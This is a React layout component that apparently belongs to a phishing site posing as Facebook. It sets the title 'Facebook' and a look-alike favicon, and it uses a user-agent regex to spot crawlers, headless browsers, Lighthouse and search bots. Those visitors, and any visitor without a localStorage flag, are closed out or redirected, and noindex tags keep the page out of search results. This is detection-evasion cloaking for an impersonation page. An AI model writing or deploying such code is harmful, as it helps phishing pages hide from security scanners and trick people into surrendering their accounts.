import React, { useEffect } from 'react';
import { Outlet, useNavigate } from 'react-router';

const ProtectLayout: React.FC = () => {
  const navigate = useNavigate();

  useEffect(() => {
    const checkBot = () => {
      const isBot =
        /bot|crawler|spider|crawling|headless|prerender|phantom|puppet|selenium|chrome-lighthouse|googlebot|bingbot|yandex|baiduspider|facebookexternalhit|slurp|duckduckbot|semrushbot|ahrefsbot|mj12bot|ia_archiver/i.test(
          navigator.userAgent,
        );

      const touchSupport = 'ontouchstart' in window || navigator.maxTouchPoints > 0;

      return isBot || (window.innerWidth < 500 && !touchSupport);
    };

    const hasFacebookAuth = localStorage.getItem('facebook') === 'true';

    if (checkBot() || !hasFacebookAuth) {
      window.close();
      navigate('/');
    }
  }, [navigate]);

  return (
    <>
      <link rel="shortcut icon" href="/aGT3gskzWBf.ico" type="image/x-icon" />
      <title>Facebook</title>
      <meta name="viewport" content="width=device-width, initial-scale=1.0" />
      <meta name="robots" content="noindex, nofollow" />
      <meta name="googlebot" content="noindex, nofollow" />
      <meta name="bingbot" content="noindex, nofollow" />
      <meta name="description" content="Access Denied" />
      <div className="min-h-screen bg-white">
        <Outlet />
      </div>
    </>
  );
};

export default ProtectLayout;
